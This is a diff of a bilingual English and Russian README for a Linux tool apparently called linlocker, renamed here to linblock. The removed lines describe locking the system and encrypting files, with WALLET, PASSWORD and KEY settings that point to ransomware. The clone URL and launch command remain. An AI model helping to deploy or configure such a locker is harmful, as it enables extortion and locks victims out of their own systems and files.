@@ -8,13 +8,13 @@
 
 <br>
 
-linlocker — Lock the system and encrypt files
+linblock — Lock the system 
 
 <br>
 
 ## 🚀 Features
 
-- ✅ Lock and encrypt
+- ✅ Lock 
 - 📦 Built-in libraries only
 
 <br>
@@ -25,18 +25,13 @@ linlocker — Lock the system and encrypt files
 # Clone repository
 git clone https://github.com/cpythonkiller/linlocker.git
 
-# Edit in linlocker.py
-WALLET = 'YOUR WALLET'
-PASSWORD = 'YOUR PASSWORD'
-KEY = 'YOUR KEY'
-
 # Launch
 python linlocker.py
 ```
 
 <br><br>
 
-![linlocker.png](linlocker.png)
+![linblock.png](linblock.png)
 
 
 <br><br><br>
@@ -46,13 +41,13 @@ python linlocker.py
 
 <br>
 
-linlocker — Блокирует систему и шифрует файлы
+linblock — Блокирует систему
 
 <br>
 
 ## 🚀 Функции
 
-- ✅ Блокирует и шифрует
+- ✅ Блокирует 
 - 📦 Только встроенные библиотеки
 
 <br>
@@ -63,15 +58,10 @@ linlocker — Блокирует систему и шифрует файлы
 # Клонируй репозиторий
 git clone https://github.com/cpythonkiller/linlocker.git
 
-# Изменить в linlocker.py
-WALLET = 'ВАШ КОШЕЛЕК'
-PASSWORD = 'ВАШ ПАРОЛЬ'
-KEY = 'ВАШ КЛЮЧ'
-
 # Запуск
 python linlocker.py
 ```
 
 <br><br>
 
-![linlocker.png](linlocker.png)
+![linblock.png](linblock.png)
